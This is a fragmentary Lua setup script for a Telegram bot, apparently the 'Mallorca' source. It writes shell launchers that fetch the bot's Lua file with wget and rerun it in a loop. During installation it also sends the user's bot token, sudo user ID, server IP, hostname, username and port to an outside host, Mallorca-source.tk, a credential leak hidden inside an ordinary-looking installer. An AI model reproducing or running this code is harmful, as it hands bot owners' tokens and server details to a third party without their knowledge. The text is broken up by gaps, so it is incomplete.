...
data,res = https.request("https://Mallorca-source.tk/MallorcaTeAM/index.php?bn=info&id="..Id)
if res == 200 then
...
Create_Info(database:get(Server_Done.."Token_Write"),database:get(Server_Done.."UserSudo_Write"))   
 local t = json:decode(https.request('https://Mallorca-source.tk/TeamMallorca/index.php?n=BK&id='..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
print("::Mallorca::")
local RunBot = io.open("MallorcaS", 'w')
RunBot:write([[
#!/usr/bin/env bash
cd $HOME/MallorcaS
token="]]..database:get(Server_Done.."Token_Write")..[["
rm -fr MallorcaS.lua
wget "https://raw.githubusercontent.com/MallorcaS/MallorcaS/master/MallorcaS.lua"
while(true) do
rm -fr ../.telegram-cli
./tg -s ./MallorcaS.lua -p PROFILE --bot=$token
done
]])
RunBot:close()
...
while(true) do
rm -fr ../.telegram-cli
screen -S MallorcaS -X kill
screen -S MallorcaS ./MallorcaS
done
]])
RunTs:close()
end
